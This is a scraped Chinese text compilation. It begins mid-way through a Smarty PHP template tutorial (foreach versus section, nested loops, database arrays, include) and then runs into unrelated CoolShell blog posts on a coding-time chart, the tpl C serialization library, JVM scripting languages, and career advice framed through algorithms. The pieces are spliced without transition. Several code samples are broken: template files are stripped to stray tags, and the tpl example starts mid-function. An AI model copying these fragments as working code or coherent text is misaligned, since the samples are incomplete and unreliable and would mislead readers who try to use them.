  index1: <{$array2[sec2].index1}>     index2: <{$array2[sec2].index2}>     index3: <{$array2[sec2].index3}>     <{/section}>     </pre>     </body>     </html>
执行上例后，我们发现不管是 foreach 或 section 两个执行结果是一样的。那么两者到底有何不同呢？第一个差别很明显，就是foreach 要以巢状处理的方式来呈现我们所 assign 的两层数组变量，而 section 则以「主数组[循环名称].子数组索引」即可将整个数组呈现出来。由此可知， Smarty 在模版中的 foreach 和 PHP 中的 foreach 是一样的；而 section 则是 Smarty 为了处理如上列的数组变量所发展出来的叙述。当然 section 的功能还不只如此，除了下一节所谈到的巢状资料呈现外，官方手册中也提供了好几个 section 的应用范例。不过要注意的是，丢给 section 的数组索引必须是从 0 开始的正整数，即 0, 1, 2, 3, …。如果您的数组索引不是从 0 开始的正整数，那么就得改用 foreach 来呈现您的资料。您可以参考官方讨论区中的此篇讨论，其中探讨了 section 和 foreach 的用法。**巢状资料的呈现**模版引擎里最令人伤脑筋的大概就是巢状资料的呈现吧，许多著名的模版引擎都会特意强调这点，不过这对 Smarty 来说却是小儿科。
最常见到的巢状资料，就算论譠程序中的讨论主题区吧。假设要呈现的结果如下：公告区站务公告文学专区好书介绍奇文共赏计算机专区硬件外围软件讨论程序中我们先以静态资料为例：test3.php:<?php     require "main.php";     $forum = array(     array("category_id" => 1, "category_name" => "公告区",     "topic" => array(     array("topic_id" => 1, "topic_name" => "站务公告")     )     ),     array("category_id" => 2, "category_name" => "文学专区",     "topic" => array(     array("topic_id" => 2, "topic_name" => "好书介绍"),     array("topic_id" => 3, "topic_name" => "奇文共赏")     )     ),     array("category_id" => 3, "category_name" => "计算机专区",     "topic" => array(     array("topic_id" => 4, "topic_name" => "硬件外围"),     array("topic_id" => 5, "topic_name" => "软件讨论")     )     )     );     $tpl->assign("forum", $forum);     $tpl->display("test3.htm");     ?>
模版的写法如下：templates/test3.htm:<html>     <head>     <title>巢状循环测试</title>     </head>     <body><tr><tr><td width="25"></td>执行的结果就像笔者举的例子一样。因此呢，在程序中我们只要想办法把所要重复值一层一层的塞到数组中，再利用 <{第一层数组[循环1].第二层数组[循环2].第三层数组[循环3]. … .数组索引}> 这样的方式来显示每一个巢状循环中的值。至于用什么方法呢？下一节使用数据库时我们再提。**转换 数据库中的资料**上面提到如何显示巢状循环，而实际上应用时我们的资料可能是从数据库中抓取出来的，所以我们就得想办法把数据库的资料变成上述的多重数组的形式。这里笔者用一个 DB 类别来抓取数据库中的资料，您可以自行用您喜欢的方法。我们只修改 PHP 程序，模版还是上面那个 (这就是模版引擎的好处~)，其中 $db 这个对象假设已经在 main.php 中建立好了，而且抓出来的资料就是上面的例子。test3.php:<?php     require "main.php";     // 先建立第一层数组     $category = array();     $db->set<span class="t_tag">SQL</span>($SQL1, 'CATEGORY');     if (!$db->query('CATEGORY')) die($db->error());     // 抓取第一层循环的资料     while ($item_category = $db->fetchAssoc('CATEGORY'))     {     // 建立第二层数组     $topic = array();     $db->setSQL(sprintf($SQL2, $item_category['category_id']), 'TOPIC');     if (!$db->query('TOPIC')) die($db->error());     // 抓取第二层循环的资料     while ($item_topic = $db->fetchAssoc('TOPIC'))     {     // 把抓取的数据推入第二层数组中     array_push($topic, $item_topic);     }     // 把第二层数组指定为第一层数组所抓取的数据中的一个成员     $item_category['topic'] = $topic;     // 把第一层数据推入第一层数组中     array_push($category, $item_category);     }     $tpl->assign("forum", $category);     $tpl->display("test3.htm");     ?>
在数据库抓取一笔资料后，我们得到的是一个包含该笔数据的数组。透过 while 叙述及 array_push 函式，我们将数据库中的资料一笔一笔塞到数组里。如果您只用到单层循环，就把第二层循环 (红色的部份) 去掉即可。**决定内容是否显示**要决定是否显示内容，我们可以使用 if 这个语法来做选择。例如如果使用者已经登入的话，我们的模版就可以这样写：<{if $is_login == true}>   显示使用者操作选单   <{else}>   显示输入帐号和密码的窗体   <{/if}>要注意的是，「==」号两边一定要各留至少一个空格符，否则 Smarty 会无法解析。if 语法一般的应用可以参照官方使用说明，所以笔者在这里就不详加介绍了。不过笔者发现了一个有趣的应用：常常会看到程序里要产生这样的一个表格： (数字代表的是资料集的顺序)1 23 45 67 8这个笔者称之为「横向重复表格」。它的特色和传统的纵向重复不同，前几节我们看到的重复表格都是从上而下，一列只有一笔资料。而横向重复表格则可以横向地在一列中产生 n 笔资料后，再换下一列，直到整个循环结束。要达到这样的功能，最简单的方式只需要 section 和 if 搭配即可。
我们来看看下面这个例子：test4.php:<?php     require "main.php";     $my_array = array(     array("value" => "0"),     array("value" => "1"),     array("value" => "2"),     array("value" => "3"),     array("value" => "4"),     array("value" => "5"),     array("value" => "6"),     array("value" => "7"),     array("value" => "8"),     array("value" => "9"));     $tpl->assign("my_array", $my_array);     $tpl->display('test4.htm');     ?>模版的写法如下：templates/test4.htm:<html>     <head>     <title>横向重复表格测试</title>     </head>     <body>
<table width="500" border="1" cellspacing="0" cellpadding="3">重点在于 $smarty.section.sec1.rownum 这个 Smarty 变量，在 section 循环中这个变量会取得从 1 开始的索引值，所以当 rownum 能被 2 除尽时，就输出 </tr><tr> 使表格换列 (注意！是 </tr> 在前面<tr> 在后面) 。因此数字 2 就是我们在一列中想要呈现的资料笔数。各位可以由此去变化其它不同的呈现方式。**加载外部内容**我们可以在模版内加载 PHP 程序代码或是另一个子模版，分别是使用 include_php 及 include 这两个 Smarty 模版语法； include_php 笔者较少用，使用方式可以查询官方手册，这里不再叙述。在使用 include 时，我们可以预先加载子模版，或是动态加载子模版。预先加载通常使用在有共同的文件标头及版权宣告；而动态加载则可以用在统一的框架页，而进一步达到如 Winamp 般可换 Skin 。当然这两种我们也可以混用，视状况而定。我们来看看下面这个例子：
test5.php:<?php     require "main.php";     $tpl->assign("title", "Include 测试");     $tpl->assign("content", "这是模版 2 中的变量");     $tpl->assign("dyn_page", "test5_3.htm");     $tpl->display('test5_1.htm');     ?>模版 1 的写法如下：templates/test5_1.htm:<html>     <head>     <meta http-equiv="Content-Type" content="text/html; charset=big5">     <title><{$title}></title>     </head>     <body>     <{include file="test5_2.htm"}>     <{include file=$dyn_page}>     <{include file="test5_4.htm" custom_var="自订变量的内容"}>     </body>     </html>
模版 2 的写法如下：templates/test5_2.htm:<{$content}>   模版 3 的写法如下：templates/test5_3.htm:这是模版 3 的内容   模版 4 的写法如下：templates/test5_4.htm:这里注意几个重点：1. 模版的位置都是以先前定义的 template_dir 为基准；2. 所有 include 进来的子模版中，其变量也会被解译。；3. include 中可以用「变量名称=变量内容」来指定引含进来的模版中所包含的变量，如同上面模版 4 的做法。# 编程时间分配图作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一个程序员coding的时间分配图，原图在这里。编程时间分配图思考会是一个很重要的过程，当然耽搁拖沓也有可能也是因为没有想好，抽烟/喝咖啡应该也是一种思考，吃点东西是为了让脑子转得更快一点，上网搜索一下灵感可以借鉴一下其它人的想法，抱怨写注释只是一个例子，更多的应该是抱怨加班或是公司的老板。如果需要加上点什么的话，我觉得应该加点“重构”，“编译”，“调试”，当然，他们都可以算在coding里。不过，我觉得更应该还有：“开会”，“争吵/解释”，“打断”，这些比重也是很大的。
所以，下面是我个人认为比较实际的版本：编程时间图（酷壳版）你的编程时间分配图是怎么样的？# 一个C的序列化库tpl作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cntpl()是一个开源的小项目，其主要是提供一个可以序列化或反序列化C语言数据的一个API函数库。tpl号称是最有效率的也是最快的，它可以把你内存中的数据存放到文件中，并可以在你需要的时候用文件中反序例化到内存变量中。而且这个函数库没有依赖于别的函数库。下面是一个简单的示例（来源于其主页）把一个数组（“序号”和“人名”）序例化到文件中。tn = tpl_map("A(is)", &id, &name);tpl_dump(tn, TPL_FILE, "users.tpl");     tpl_free(tn);     }把上面那个序列化到文件的“序号”和“人名”反序列化回来。tn = tpl_map("A(is)", &id, &name);     tpl_load(tn, TPL_FILE, "users.tpl");更详细的使用说明请看其文档：# 五大基于JVM的脚本语言作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cn还记得以前本站的一篇文章《如何在Google App Engine上运行PHP》吗，其实那是借用 Quercus， 一个 100% 的用Java 实现的一个 PHP 引擎。今天，这样的东西太多了，能运行在Java的虚拟机JVM上的程序意味着有天然的跨平台性，现在JVM并不单单只能运行Java程序，在JVM上出现了若干使用Java虚拟机运行的脚本程序，比如什么PHP, Python, Ruby等等，这里有一篇文章评论了在JVM上的可以运行的排名前五脚本语言。他们分别是：1.  **Groovy**。构建在强大的Java语言之上 并添加了从Python，Ruby和Smalltalk等语言中学到的诸多特征，为Java开发者提供了现代最流行的编程语言特性，而且学习成本很低（几乎为零），在开发Web，GUI，数据库或控制台程序时， 通过减少框架性代码 大大提高了开发者的效率。支持单元测试和模拟（对象），可以简化测试。无缝集成 所有已经存在的 Java对象和类库。直接编译成Java字节码，这样可以在任何使用Java的地方 使用Groovy。   2. **JRuby**。一个纯Java实现的Ruby解释器。通过JRuby，你可以在JVM上直接运行Ruby程序，调用Java的类库。很多Java编写的Ruby IDE都是使用JRuby来解释语法的。   3.  **Scala**。一种多范式的编程语言，设计意图是要整合面向对象编程和函数式编程的各种特性。Scala编程语言近来抓住了很多开发者的眼球。它看起来像是一种纯粹的面向对象编程语言，而又无缝地结合了命令式和函数式的编程风格。Scala的名称表明，它还是一种高度可伸缩的语言。Scala的设计始终贯穿着一个理念：创造一种更好地支持组件的语言。   4. **Fantom**。Fantom 前身是 (Fan) 是一个基于 Java 和 .NET 平台的编程脚本引擎，用来在运行时产生 JVM 和 .NET 平台的字节码，该语言是面向对象的，跟 Groovy 和 JRuby 有点类似，可通过特定的接口来集成 Java 的类库。   5. **Jython**。Jython由于继承了Java和Python二者的特性而显得很独特。其是一种完整的语言，而不是一个Java翻译器或仅仅是一个Python编译器，它是一个Python语言在Java中的完全实现。Jython也有很多从CPython中继承的模块库。最有趣的事情是Jython不像CPython或其他任何高级语言，它提供了对其实现语言的一切存取。所以Jython不仅给你提供了Python的库，同时也提供了所有的Java类。这使其有一个巨大的资源库。
下面是一张表格比较了这五大JVM脚本语言：| **Groovy** | **JRuby** | **Scala** | **Fantom** | **Jython**   ---|---|---|---|---|---   **风格类型** | OO / 动态 | OO / 动态 | OO, 过程/ 静态 | OO / 静态 | OO / 动态   **源语言** | Java | Ruby | N/A | N/A | Python   **运行** | 编译型 | 编译型,   解释型 | 编译型 | 半编译型 | 编译型   **平台** | JVM | JVM | JVM | JVM, .Net CLR | JVM   **Java集成** | 极好 | 极好 | 极好 | 好 | 极好   **运行速度** | 好 | 好 | 极好 | 很好 | 慢   **工具支持** | 广泛 | 还可以 | 广泛 | 几乎没有 | 几乎没有其它一些JVM的脚本语言也我们可以关注一下，如： **Clojure**, **JavaFX**, 和IBM的 **NetRexx**。（全文完）# 别让自己“墙”了自己
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这一两周与几个朋友聊天，有年轻的90后，也有大叔级的70后，这些人在我看来都是很有能力的人，但是一些喜好过于强烈，让我不经意地回顾了我工作20年来身边的人，有发展得好的，也有发展的不好的，有些人是很可惜的，因为限制他们的不是其它人，也不是环境，而是自己，所以，很想写下这篇文章。（注：这篇文章可能会是一篇说教的文章，所以，可能会让你看着犯困，所以，我会尽量地短一些，而且尽可能多讲故事，少道理，这里的故事，全是真实发生的）#### 几个故事2019年年初，我面试了一个很年轻的小伙子（93/94年出生），这个小伙子特别有灵性，也很聪明，计算机专业出身，也很喜欢技术，基础和学习能力也很好。在我这20年来认识的人中，如果他能呆在北京、上海、深圳这样的城市，我保证不出三年，他会成为他们同龄人中非常出色的技术人员，如果有个好的舞台有一个好的团队带他，他的未来会非常成功。然而，这个小伙子有两大喜好：1）只愿（或是说被迫）呆在一个毫无IT的环境的三/四线城市，2）对技术有非常大的偏好，只喜欢Go语言，非常不喜欢其它的语言，比如：Java（离开Java的世界，基本上离开了做架构的世界（ **相关解释见文末** ））。
他的这两个喜好，足以让一个未来会很优秀的人毁掉，因为，这个时代没有限制他，他的能力也没有限制他，但是他的意识完完全全地限制了他。* 他把自己最宝贵的青春放在了很烂的项目上，就算能用一些新的技术，他也只能算是自娱自乐，在实验室中玩玩具罢了。   * 他把自己的技术栈封闭起来，而直接放弃了这个时代最具工业化的技术Java，对于一个好的程序员来说，同时掌握几门语言和技术完全是没什么问题，但是自己封闭了自己的视野。实在是非常可惜，我本来是可以为他介绍到一些很不错的公司的，但是他这样的习性，等于自己把自己未来的门给关上了，虽然我跟他长谈过，但是我也没有办法叫醒不想醒的人……* 视野、环境和舞台，对一个人的限制是非常大的。井蛙不知道大海，被空间维度所限制；夏虫不知道冬天，是被时间维度所限制；圈养的动物没有斗志，是被自己意识所限制。   * 偏见和不开放，对一个人的限制是真正有毁灭性的。主动让自己成为一个瞎子和聋子，主动把自己的能力阉割掉，这是一件令人痛心的事。想想大清的闭关锁国是如何让亚洲第一的北洋水师给毁掉的……我还有个同学，他的技术并不差，就算呆在昆明这种很落后的地方，他也非常地好学，学习英文，学习各种新技术，对技术没有任何的偏好，喜欢C/C++/Java/Python/Shell，同样喜欢前端Javascript，对基础知识非常地踏实，他在技术上没有限制自己的潜力，有什么就学什么。后来，我带他玩Docker/Go/K8S……分布式架构，他也上手的很快……像他这样的人，技术能力完全没得说，比我还大一岁，44岁了，还是一样的天天追代码细节，看Youtube的各种大会，翻github里的各种issue和pull request……
我同学这人，拥有了成为一个技术牛人几乎所有的条件：基础知识过硬，细节扎得深，面很广，学习能力强，有英文能力，逻辑思维能力不错，非常的自律，执行力也很强，抓得住重点……然而，只有一个小问题，就是没有到大公司历练过，我三番五次叫他从昆明出来，但是最终他都呆在昆明这个城市没有出来，因为有所谓的家庭约束。然而，我身边还有好些人，把自己家从北京搬到上海，从上海搬到深圳，从厦门搬到深圳……这样的人大有人在……像他这样的能力，在哪个公司都会是主力和骨干，对于一个公司的主力和骨干来说，家庭上的这些问题都是小问题都是有很多解的……另外，我这个同学还是一个比较悲观的人，任何事情都是先想到不好的事，他关注负面的东西会胜于正面的东西，而且他还有一定的社交恐惧，怕与人相处和交流，时间越长越害怕，甚至有时候直接跟我说，“我就是不想改变”这样的话……其实，我以前也是一个很害怕与人交流的人，面试的时候，我根本不敢正眼看面试官一眼，也不知道与人怎么交流。但是，我与他不一样，我努力克服，不断地面试，与人面对面的交流，到一线技术客服接用户的电话，在公司里做分享，慢慢地到外面分享……3-5年就完全克服掉了。其实，很多事情，完全是有解的，也没有必要担心，自己的心理障碍也是可以克服的，重点就是自己愿不愿意，只要愿意完成了一半，接下来就是不断的摸爬滚打坚持了。
* 不限制自己的人，会穷举各种方法来解决问题，限制自己的人，只会找各式各样的问题或借口。   * 不限制自己的人，会努力改变自己的问题和缺陷，限制自己的人，会放任自己。#### 另外几个故事我还有另外几个故事（活到四十多，能看到好多人十几年的发展过程，感觉有点上帝视角了）我还有一个以前团队里的一个小伙，人是很聪明，但就完全就是野路子，他对技术没有什么偏好，一个PHP程序员，做那个Discuz!论坛，公司被并购了，转成Java，开始研究Java的各种细节，对技术从来没有什么偏见，有什么就玩什么，每做一个项目，就算是一样的他都要用新的技术做一遍，然后跟着我做云计算，我教他TCP，教他C/C++，后来一起玩Docker/Go，等等，反正是一点就通，他是我见过学习能力最强的人。但是，有一个事他一直与我的想法不一样，就是我希望他先把软件设计好，再写代码，他非常不能理解，他习惯于直接动手开干，然后有什么问题就整什么问题，我也很难教育他。有一天，他电话面了一下Facebook，电话面了15分钟后对方就放弃了，他受到了严重的打击。然后，他就开始找菲利宾人练英文口语了，我也让他做算法题，然后，他才发现，一道连算法都不是的纯编程题都提交几次都过不了，等他做完了Leetcode最初的那151道题后，整个人都改变了，写代码前认认真真地在纸上把程序的状态，处理时序以及可能遇到的一些条件先罗列出来，然后，进行逻辑设计后，再写，从此，他就开启他更大的天地了。我后来把他推荐给了微软，先在中国的Bing，在中国升好2-3级，然后去了美国的Azure，现在听说他准备要跟 k8s 的 co-founder Brendan Burns 混了（虽然，他现在还在印度人手下，但是，我真的不知道他未来能玩多大，因为今年他才33岁，而且非常聪明）
他以前是把自己封闭起来的，我叫他出来，他也不出来，后来因为一些办公室政治的原因不得不来找我，于是我就带着他玩了两年，跟他讲了很多外面的世界是怎么玩的，他这个人也是一个相当不善于社交的人，但是心是开放的，愿意接受新的东西，虽然对技术也有一定偏见，比如不喜欢Windows，但是也不会不喜欢到完全封闭。后来我跟他说，微软的技术相当的强的，你看到的技术只是表面，深层次的东西都是相通的，直到他到了微软后发现各种牛逼的东西，对微软系统的技术的态度也有了改变，而且我让他跟我说很多微软那边的事，我发现，他对技术了解的维度已经是越来越高级的了……还是我以前团队的一个小伙，他是一个前端，他说前端的东西没什么意思，想来找我做后端，我也一点点带他……后来，我说，你如果想要玩得好，你必需来北京，无论现在你觉得过得有多好，你都要放弃掉，然后，尽最大可能出去经历一下世界最顶尖的公司，我甚至跟他说，如果他女朋友不跟来的话，就先分开一段时间，先自己立业，他来北京的时候，他之前的同事都等着看他的笑话，我说，那些人连想都不敢想，不必管他们。于是，他去了Amazon，再过了一年去了西雅图，我跟他说，接下来就是去AWS，然后，如果有足够的野心，用自己的年轻这个资本去硅谷创业公司赌一把……未来他怎么样我不知道，但至少他没有限制自己，他的未来不会有封顶……
也是我的同学，我跟他在大学是上下铺，后来他去了人民大学读计算机博士，大学的时候做国产数据库kingbase，然后去了一家外企，天天被派到用户那边做数据分析，后来，他想回科研单位做国产数据库，我说，别啊，你的技术比我好太多，还有博士理论加持，你不去国外顶尖公司玩玩，你不知道自己有多强的，于是他跟公司申请去了国外做核心，后来因为Hadoop的原因，公司的产品最终成为了历史，于是我说，你来了美国么，你一定要去AWS，于是他就去了AWS的Aurora团队，成为了AWS明星级产品的中坚力量，天天在改MySQL的核心源码，干了两年，正在晋升 Principal Software Engineer ……这里我到不是说出国有多牛，也许你只关注能挣多少钱，但是我想说，他们之所以能有这样的际遇，除了他们本来就有实力，还更因为他们从来不给自己设制什么限制，就是那种“艺多不压身”，有什么就学什么，有更高的就去向更高的迈进，其它的像家庭什么的问题其实都是会有解的，真的不必担心太多……####  别限制了自己上面的这些故事，也许你能看得懂，也许你看得不一定能懂，这里，让我来做个总结吧* **做有价值的事** 。这个世界对计算机人才的要求是供不应求的，所以，不要让自己为自己找各式各样的借口，让自己活在“玩玩具”、“搬砖”和“使蛮力加班”的境地。其实，我发现这世界上有能力的人并不少，但是有品味的人的确很少。 **所谓的有价值，就是，别人愿付高价的，高技术门槛的，有创造力的，有颠覆性的** ……   * **扩大自己的眼界，开放自己的内心** 。人要变得开放，千万不要做一个狭隘的民族主义者，做一个开放的人，把目光放在全人类这个维度，不断地把自己融入到世界上，而不是把自己封闭起来，这里， **你的英文语言能力对你能不能融入世界是起决定性的作用** 。开放自己的心态，正视自己的缺点，你才可能往前迈进。 **你的视野决定了你的知不知道要去哪，你的开放决定了你想不想去** 。   * **站在更高的维度** 。面的维度会超过点的维点，空间的维度会超过面的维度，在更高维度上思考和学习，你会获得更多。 **整天在焦虑那些低维度的事（比如自己的薪水、工作的地点、稳不稳定、有没有户口……），只会让你变得越来越平庸，只要你站在更高的维度（比如： 眼界有没有扩大、可能性是不是更多、竞争力是不是更强、能不能解决更大更难的问题、能创造多大的价值……），时间会让你明白那些低维度的东西全都不是事儿** 。技术学习上也一样，站在学习编程语法特性的维度和站在学习编程范式、设计模式的维度是两种完全不一样的学习方式。   * **精于计算得失** 。很多人其实不是很懂计算。绝大多数人都是在算计自己会失去多少，而不会算会得到多少。而一般的人也总是在算短期内会失去什么，优秀则总是会算我投入后未来会有什么样的回报，前者在算计今天，目光短浅，而后者则是舍在今天，得在明天，计算的是未来。 ** **精于计算得失的，就懂得什么是投资，不懂的只会投机。对于赚钱，你可以投机，但是对于自己最好还是投资。****   * **勇于跳出传统的束缚** 。有时候，跳出传统并不是一件很容易的事，因为大多数人都会对未知有恐惧的心理。比如：我看到很多人才都被大公司垄断了，其实，有能力的人都不需要加入大公司，有能力的人是少数，这些少数的人应该是所有的公司share着用的，这样一来，对于所有的人都是利益最大化的。这样的事现在也有，比如：律师、设计师……。但是，绝大多数有能力的技术人员是不敢走出这步。我在2015年到2016年实践过一年半，有过这些实践，做“鸡”的比“二奶”好多了，收入也好很多很多（不好意思开车了）……
庄子说过几句话——> 井蛙不可以语于海者，拘于虚也；//空间局限 > > 夏虫不可以语于冰者，笃于时也；//时间局限 > > 曲士不可以语于道者，束于教也。//认识局限别自己墙了自己，人最可悲的就是自己限制自己，想都不敢想，共勉！————————————————————**注：这篇文章就是要劝大家更为开放，让自己有更多的可能性，能到更高的层次，做更有价值的事，成为更强更好的人……当然，如果你觉得你只想做一个平凡人，也和本文并不冲突……另外你也不要觉得这篇文章是让你要成为一个精英，但你一定要去摸高……这篇文章是告诉你一种面对人生的思考方式，在这种思考方式下，你会有更多的可能性，更大的场景……而不是直接把自己归到“平常人”，把自己“墙”了！**注：我以为用Java适合做架构这事应该是常识了，但是评论中有很多人非常反对这个事。那我解释一下吧：首先，小型的项目用什么语言都行，爱用什么用什么。但是，真正的企业级架构就不一样了，其中并不仅仅只是RESTful API或RPC，还有各种配套设施和控制系统，比如：应用网关，服务发现、配置中心、健康检查、服务监控、服务治理（熔断、限流、幂等、重试、隔离、事务补偿）、Tracing监控、SOA/ESB、CQRS、EDA……这些东西在非Java的技术栈体系内，很难看到全貌， **Java强大的生态环境，就是让你把注意力放到更高层次的架构和业务上来的** 。（千万不要觉得，整几个服务RPC一下，加个缓存，加个队列，就能叫架构，那只是系统集成罢了）
（全文完）# 程序算法与人生选择作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn每年一到要找工作的时候，我就能收到很多人给我发来的邮件，总是问我怎么选择他们的offer，去腾讯还是去豆瓣，去外企还是去国内的企业，去创业还是去考研，来北京还是回老家，该不该去创新工场？该不该去thoughtworks？……等等，等等。今年从7月份到现在，我收到并回复了60多封这样的邮件。我更多帮他们整理思路，帮他们明白自己最想要的是什么。（注：我以后不再回复类似的邮件了）。我深深地发现，对于我国这样从小被父母和老师安排各种事情长大的人，当有一天，父母和老师都跟不上的时候，我们几乎完全不知道怎么去做选择。而我最近也离开了亚马逊，换了一个工作。又正值年底，就像去年的那篇《三个故事和三个问题》一样，让我想到写一篇这样的文章。目录* 几个例子   * 排序算法   * 贪婪算法   * 动态规划   * Dijkstra最短路径   * 算法就是Trade-Off#### 几个例子当我们在面对各种对选择的影响因子的时候，如：城市，公司规模，公司性质，薪水，项目，户口，技术，方向，眼界…… 你总会发现，你会在几个公司中纠结一些东西，举几个例子：
* 某网友和我说，他们去上海腾讯，因为腾讯的规模很大，但却发现薪水待遇没有豆瓣高（低的还不是一点），如果以后要换工作的话，起薪点直接关系到了以后的高工资。我说那就去豆瓣吧，他说豆瓣在北京，污染那么严重，又没有户口，生存环境不好。我说去腾讯吧，他说腾讯最近组织调整，不稳定。我说那就去豆瓣吧，慢公司，发展很稳当。他说，豆瓣的盈利不清楚，而且用Python，自己不喜欢。我说，那就去腾讯吧，……* 还有一网友和我说，他想回老家，因为老家的人脉关系比较好，能混得好。但又想留在大城市，因为大城市可以开眼界。* 另一网友和我说，他想进外企，练练英语，开开眼界，但是又怕在外企里当个螺丝钉，想法得不到实施。朋友拉他去创业，觉得创业挺好的，锻炼大，但是朋友做的那个不知道能不能做好。* 还有一网友在创新工场的某团队和考研之间抉择，不知道去创新工场行不行，觉得那个项目一般，但是感觉那个团队挺有激情的，另一方面觉得自己的学历还不够，读个研应该能找到更好的工作。* 还有一些朋友问题我应该学什么技术？不应该学什么技术？或是怎么学会学得最快，技术的路径应该是什么？有的说只做后端不做前端，有的说，只做算法研究，不做工程，等等，等等。因为他们觉得人生有限，术业有专攻。
* 等等，等等……我个人觉得，如果是非计算机科班出生的人不会做选择，不知道怎么走也罢了，但是我们计算机科班出生的人是学过算法的， **懂算法的人应该是知道怎么做选择的** 。######## 排序算法你不可能要所有的东西，所以你只能要你最重要的东西，你要知道什么东西最重要，你就需要对你心内的那些欲望和抱负有清楚的认识，不然，你就会在纠结中度过。所以，在选择中纠结的人有必要参考一下排序算法。* 首先，你最需要参考的就是“冒泡排序”——这种算法的思路就是每次冒泡出一个最大的数。所以，你有必要问问你自己，面对那些影响你选择的因子，如果你只能要一个的话，你会要哪个？而剩下的都可以放弃。于是，当你把最大的数，一个一个冒泡出来的时候，并用这个决策因子来过滤选项的时候，你就能比较容易地知道知道你应该选什么了。 **这个算法告诉我们，人的杂念越少，就越容易做出选择。*** 好吧，可能你已茫然到了怎么比较两个决策因子的大小，比如：你分不清楚，工资>业务前景吗？业务前景>能力提升吗？所以你完全没有办法进行冒泡法。那你，你不妨参考一个“快速排序”的思路——这个算法告诉我们，我们一开始并不需要找到最大的数，我们只需要把你价值观中的某个标准拿出来，然后，把可以满足这个价值的放到右边，不能的放到左边去。比如，你的标准是：工资大于5000元&&业务前景长于3年的公司，你可以用这个标准来过滤你的选项。然后，你可以再调整这个标准再继续递归下去。 **这个算法告诉我们，我们的选择标准越清晰，我们就越容易做出选择** 。
这是排序算法中最经典的两个算法了，面试必考。相信你已烂熟于心中了。所以，我觉得你把这个算法应用于你的人生选择也应该不是什么问题。关于在于，你是否知道自己想要的是什么？排序算法的核心思想就是， **让你帮助你认清自己最需要的是什么，认清自己最想要的是什么，然后根据这个去做选择** 。#### 贪婪算法所谓贪婪算法，是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择（注意：是当前状态下），从而希望导致结果是最好或最优的算法。贪婪算法最经典的一个例子就是哈夫曼编码。对于人类来说，一般人在行为处事的时候都会使用到贪婪算法，* 比如在找零钱的时候，如果要找补36元，我们一般会按这样的顺序找钱：20元，10元，5元，1元。* 或者我们在过十字路口的时候，要从到对角线的那个街区时，我们也会使用贪婪算法——哪边的绿灯先亮了我们就先过到那边去，然后再转身90度等红灯再过街。这样的例子有很多。对于选择中，大多数人都会选用贪婪算法，因为这是一个比较简单的算法，未来太复杂了，只能走一步看一步，在当前的状况下做出最利于自己的判断和选择即可。有的人会贪婪薪水，有的人会贪婪做的项目，有的人会贪婪业务，有的人会贪婪职位，有的人会贪婪自己的兴趣……这些都没什么问题。贪婪算法并没有错，虽然不是全局最优解，但其可以让你找到局部最优解或是次优解。其实，有次优解也不错了。 **贪婪算法基本上是一种急功近利的算法，但是并不代表这种算法不好，如果贪婪的是一种长远和持续，又未尝不可呢？** 。
#### 动态规划但是我们知道，对于大部分的问题，贪婪法通常都不能找出最优解，因为他们一般没有测试所有可能的解。 **因为贪婪算法是一种短视的行为，只会跟据当前的形式做判断，也就是过早做决定** ，因而没法达到最佳解。动态规划和贪婪算法的最大不同是，贪婪算法做出选择，不能在过程优化。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，会动态优化功能。动态规划算法至少告诉我们两个事：1） **承前启后非常重要，** 当你准备去做遍历的时候，你的上次的经历不但能开启你以后的经历，而且还能为后面的经历所用。你的每一步都没有浪费。2） **是否可以回退也很重要** 。这意思是——如果你面前有两个选择，一个是A公司一个是B公司，如果今天你选了A公司，并不是你完全放弃了B公司。而是，你知道从A公司退出来去B公司，会比从B公司退出来去A公司要容易一些。比如说：你有两个offer，一个是Yahoo，一个是Baidu，上述的第一点会让我们思考，我以前的特长和能力更符合Yahoo还是Baidu？而Yahoo和Baidu谁能给我开启更大的平台？上述的第二点告诉我们，是进入Yahoo后如果没有选好，是否还能再选择Baidu公司？还是进入Baidu公司后能容易回退到Yahoo公司？
#### **Dijkstra** 最短路径最短路径是一个Greedy + DP的算法。相当经典。这个算法的大意如下：1）在初始化的时候，所有的结点都和我是无穷大，默认是达不到的。2）从离自己最近的结点开始贪婪。3）走过去，看看又能到达什么样的结点，计算并更新到所有目标点的距离。4）再贪婪与原点最短的结点，如此反复。这个算法给我们带来了一些这样的启示：* 有朋友和我说过他想成为一个架构师，或是某技术领域的专家，并会踏踏实实的向这个目标前进，永不放弃。我还是鼓励了他，但我也告诉他了这个著名的算法，我说，这个算法告诉你，架构师或某领域的专家对你来说目前的距离是无穷大，他们放在心中，先看看你能够得着的东西。 **所谓踏实，并不是踏踏实实追求你的目标，而是踏踏实实把你够得着看得见的就在身边的东西干好。** 我还记得我刚参加工作，从老家出来的时候，从来没有想过要成为一个技术牛人，也从来没有想过我的博客会那么的有影响力，在做自己力所能及，看得见摸得着的事情，我就看见什么技术就学什么，学着学着就知道怎么学更轻松，怎么学更扎实，这也许就是我的最短路径。* 有很多朋友问我要不要学C++，或是问我学Python还是学Ruby，是不是不用学前端，等等。这些朋友告诉我，他们不可能学习多个语言，学了不用也就忘了，而且术业有专攻。这并没有什么不对的，只是我个人觉得，学习一个东西没有必要只有两种状态，一种是不学，另一种是精通。了解一个技术其实花不了多少时间，我学C++的目的其实是为了更懂Java，学TCP/IP协议其实是为了更懂Socket编程，很多东西都是连通和相辅相成的，学好了C/C++/Unix/TCP等这些基础技术后，我发现到达别的技术路径一下缩短了（这就是为什么我用两天时间就可以了解Go语言的原因）。 **这就好像这个算法一样，算法效率不高，也许达到你的目标，你在一开始花了很长时间，遍历了很多地方，但是，这也许这就是你的最短路径（** 比起你达不到要好得多 **）** 。
